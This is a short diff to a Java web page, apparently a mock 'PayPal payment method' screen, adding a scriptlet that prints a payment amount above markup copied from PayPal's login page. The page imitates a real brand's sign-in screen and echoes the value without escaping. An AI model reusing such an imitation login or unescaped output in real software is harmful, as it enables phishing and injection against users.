@@ -7,7 +7,10 @@
 <title>Metoda Plata PayPal</title>
 </head>
 <body>
-
+<%
+					String sumaDePlata = (String) request.getAttribute("sumaDePlata");
+				%>
+				<h1 style="text-align:center;"> You have to pay: <%=sumaDePlata%></h1>
 <div id="main" class="main " role="main">
     <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
         <div class="corral">
